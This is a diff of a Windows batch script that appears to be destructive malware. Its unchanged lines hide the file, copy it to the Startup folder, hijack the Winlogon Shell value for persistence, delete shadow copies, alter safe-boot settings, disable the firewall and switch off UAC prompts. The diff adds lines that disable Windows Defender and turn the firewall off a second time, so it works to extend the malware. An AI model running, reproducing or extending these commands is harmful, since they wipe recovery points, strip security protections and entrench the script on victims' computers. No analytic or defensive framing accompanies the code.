@@ -2,6 +2,7 @@
 setlocal enabledelayedexpansion
 
 attrib +s +h +i +l +x +a "%0" >nul
+wmic process where name="cmd.exe" call setpriority "idle" >nul 2>&1
 copy %0 "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 copy %0 "C:\Windows\Tasks\bat.bat" >nul
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe, C:\Windows\Tasks\bat.bat" /f
@@ -34,6 +35,8 @@ vssadmin delete shadows /all /quiet >nul
 wmic shadowcopy delete >nul 2>&1
 bcdedit /deletevalue {current} safeboot >nul 2>&1
 netsh advfirewall set allprofiles state off
+sc config WinDefend start= disabled >nul 2>&1
+netsh advfirewall set allprofiles state off >nul 2>&1
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v "OptionValue" /t REG_DWORD /d 1 /f
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal" /v "OptionValue" /t REG_DWORD /d 1 /f
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network" /v "OptionValue" /t REG_DWORD /d 1 /f
@@ -102,4 +105,3 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "Und
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ScRemoveOption" /t REG_DWORD /d 1 /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f
 reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d "0" /f >nul
-
